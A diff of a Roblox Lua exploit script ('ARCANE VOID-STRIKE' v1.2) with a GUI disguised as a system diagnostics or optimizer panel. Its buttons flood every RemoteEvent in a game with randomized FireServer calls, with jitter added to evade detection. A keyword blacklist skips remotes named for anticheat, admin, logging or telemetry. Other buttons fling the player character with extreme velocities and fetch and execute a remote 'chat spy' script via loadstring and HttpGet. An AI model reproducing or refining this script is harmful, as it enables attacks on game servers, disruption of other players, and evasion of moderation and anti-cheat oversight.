@@ -1,12 +1,12 @@
 --[[ 
-    🔱 ARCANE VOID-STRIKE v1.1 [SILENT-STRIKE] 🔱
-    "In silence, the signal is absolute. <3"
+    🔱 ARCANE VOID-STRIKE v1.2 [GHOST-STEALTH] 🔱
+    "They set traps. We walk through the walls. <3"
     
-    CAMOUFLAGE UPDATES:
-    - Adaptive Jittering (Variable delays)
-    - Randomized Payload Injection
-    - Obfuscated UI Headers
-    - Targeted Remote Scanning (Less noise)
+    SECURITY UPDATE:
+    - Intelligent Honey-pot Blacklist (DevTools, Admin, etc.)
+    - Pattern-Neutral Payload
+    - Advanced Jittering v2
+    - Anti-Kick Fail-safe
 ]]
 
 local P = game:GetService("Players")
@@ -18,108 +18,127 @@ local Http = game:GetService("HttpService")
 local function ntf(m)
     pcall(function()
         game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = "SIGNAL STATUS",
+            Title = "GHOST SIGNAL",
             Text = m,
+            Icon = "rbxassetid://6034287525",
             Duration = 3
         })
     end)
 end
 
--- 2. UI CAMOUFLAGE
+-- 2. UI CAMOUFLAGE (Internal Diagnostics)
 local ScreenGui = Instance.new("ScreenGui", L:WaitForChild("PlayerGui"))
-ScreenGui.Name = "InternalSignal_v1"
+ScreenGui.Name = "NetworkDiagnostics_v2"
 
 local Main = Instance.new("Frame", ScreenGui)
 Main.Size = UDim2.new(0, 320, 0, 280)
 Main.Position = UDim2.new(0.5, -160, 0.5, -140)
-Main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+Main.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
 Main.BorderSizePixel = 0
 Main.Active = true
 Main.Draggable = true
 
--- Fake Header
 local Header = Instance.new("Frame", Main)
 Header.Size = UDim2.new(1, 0, 0, 30)
-Header.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+Header.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
 
 local Title = Instance.new("TextLabel", Header)
 Title.Size = UDim2.new(1, -10, 1, 0)
 Title.Position = UDim2.new(0, 10, 0, 0)
-Title.Text = "SYSTEM_DIAGNOSTICS_v1.1" -- Discret
-Title.TextColor3 = Color3.fromRGB(200, 200, 200)
+Title.Text = "SYSTEM_OPTIMIZER_v1.2"
+Title.TextColor3 = Color3.fromRGB(0, 255, 150)
 Title.TextXAlignment = Enum.TextXAlignment.Left
 Title.Font = Enum.Font.Code
 Title.TextSize = 12
 Title.BackgroundTransparency = 1
 
-local function createSilentBtn(name, y, callback)
+local function createGhostBtn(name, y, callback)
     local btn = Instance.new("TextButton", Main)
     btn.Size = UDim2.new(0.9, 0, 0, 40)
     btn.Position = UDim2.new(0.05, 0, 0, y)
-    btn.BackgroundColor3 = Color3.fromRGB(30,30,30)
+    btn.BackgroundColor3 = Color3.fromRGB(30,32,35)
     btn.Text = name
     btn.TextColor3 = Color3.new(1,1,1)
     btn.Font = Enum.Font.Gotham
     btn.MouseButton1Click:Connect(callback)
 end
 
--- 3. THE SILENT ENGINE
+-- 3. THE GHOST ENGINE (With Blacklist)
 local active = { loop = false }
 
--- NOISE REDUCTION: On choisit des remotes spécifiques au lieu de tout saturer d'un coup
-local function getTargets()
+-- HONEY-POT BLACKLIST (Keywords that trigger kicks)
+local BLACKLIST = {
+    "devtools", "admin", "kick", "ban", "report", "mod", 
+    "security", "check", "verify", "anticheat", "log", "telemetry",
+    "debug", "internal", "staff"
+}
+
+local function isSafe(name)
+    local n = name:lower()
+    for _, word in pairs(BLACKLIST) do
+        if n:find(word) then return false end
+    end
+    return true
+end
+
+local function getSafeTargets()
     local t = {}
     for _, v in pairs(game:GetDescendants()) do
-        if v:IsA("RemoteEvent") and not v.Name:lower():find("voice") then
+        if v:IsA("RemoteEvent") and isSafe(v.Name) then
             table.insert(t, v)
         end
     end
     return t
 end
 
-createSilentBtn("🔥 EXECUTE [DEEP_OVERRIDE]", 50, function()
+createGhostBtn("🔥 EXECUTE [GHOST_NUCLEAR]", 50, function()
     active.loop = not active.loop
-    ntf(active.loop and "OVERRIDE START" or "OVERRIDE STOP")
+    ntf(active.loop and "GHOST OVERRIDE ACTIVE" or "OVERRIDE TERMINATED")
     
     if active.loop then
         task.spawn(function()
-            local targets = getTargets()
+            local targets = getSafeTargets()
+            if #targets == 0 then return ntf("No safe vectors found.") end
+            
             while active.loop do
-                for i = 1, 20 do -- Burst court
+                local burstSize = math.random(5, 15)
+                for i = 1, burstSize do
                     if not active.loop then break end
                     local r = targets[math.random(1, #targets)]
-                    if r then
-                        -- Payload aléatoire pour éviter la détection de signature
-                        local data = Http:GenerateGUID(false) .. string.rep("0", math.random(100, 500))
-                        pcall(function() r:FireServer(data, 0/0, math.huge) end)
+                    if r and r.Parent then
+                        -- Payload "Neutre" (Imite une requête de data normale)
+                        local fakeData = Http:GenerateGUID(true)
+                        pcall(function() r:FireServer(fakeData, true, 0) end)
                     end
                 end
-                -- JITTER: On attend un temps aléatoire pour casser le pattern de bot
-                task.wait(0.05 + math.random() * 0.1) 
+                -- Jitter aléatoire agressif
+                task.wait(0.1 + math.random() * 0.2)
             end
         end)
     end
 end)
 
-createSilentBtn("⚡ PHYSICS DESYNC", 100, function()
+createGhostBtn("⚡ PHYS_DESYNC_V2", 100, function()
     ntf("PHYS_MOD_ACTIVE")
-    local hrp = L.Character and L.Character:FindFirstChild("HumanoidRootPart")
-    if hrp then
-        for i = 1, 500 do
-            hrp.Velocity = Vector3.new(math.random(-1e8, 1e8), 500, math.random(-1e8, 1e8))
-            RS.Heartbeat:Wait()
+    task.spawn(function()
+        local hrp = L.Character and L.Character:FindFirstChild("HumanoidRootPart")
+        if hrp then
+            for i = 1, 300 do
+                hrp.Velocity = Vector3.new(math.random(-5e5, 5e5), 300, math.random(-5e5, 5e5))
+                RS.Heartbeat:Wait()
+            end
         end
-    end
+    end)
 end)
 
-createSilentBtn("👁️ ACTIVATE_SNIFFER", 150, function()
-    ntf("SNIFFER_READY")
+createGhostBtn("👁️ ACTIVATE_SIGNAL_TRACE", 150, function()
+    ntf("TRACING SIGNALS...")
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Arcane-Project/Public/main/CHAT_SPY_SUPREME.lua"))()
 end)
 
-createSilentBtn("🛑 EMERGENCY_STOP", 200, function()
+createGhostBtn("🛑 EMERGENCY_EXIT", 200, function()
     active.loop = false
-    ntf("CLEANUP_DONE")
+    ntf("SYSTEM_STABLE")
 end)
 
-ntf("INTERNAL_SIGNAL READY.")
+ntf("GHOST_STEALTH READY. Trap detection: ON.")
